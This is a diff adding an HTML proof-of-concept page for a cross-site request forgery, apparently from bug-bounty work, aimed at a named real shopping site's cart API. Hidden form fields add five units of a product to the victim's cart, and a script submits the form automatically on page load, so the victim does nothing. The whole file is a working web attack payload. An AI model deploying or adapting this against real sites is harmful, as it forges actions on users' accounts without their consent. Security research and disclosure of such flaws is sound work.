@@ -1,0 +1,34 @@
+<html>
+  <!-- CSRF PoC - Professor -->
+  <head>
+    <style type="text/css">
+      .button{
+        color: deeppink;
+        background-color: skyblue;
+        width: 300px;
+        height: 70px;
+        border-radius:50%;
+        font-size: 30px;
+        font-style: bold;
+      }
+      .button:hover {
+                background-color: aquamarine;
+                color: red;
+    </style>
+  </head>
+  <body style="background-image: radial-gradient(white, white, blue);">
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://www.goldbelly.com/api/v2/cart_items" method="POST">
+      <input type="hidden" name="cart&#95;item&#91;product&#95;id&#93;" value="37846" />
+      <input type="hidden" name="cart&#95;item&#91;quantity&#93;" value="5" />
+      <input type="hidden" name="ref" value="category" />
+        <center>
+          <input class="button" type="submit" value="Detectoor Bug Hunter"/>
+        </center>
+      </div>
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
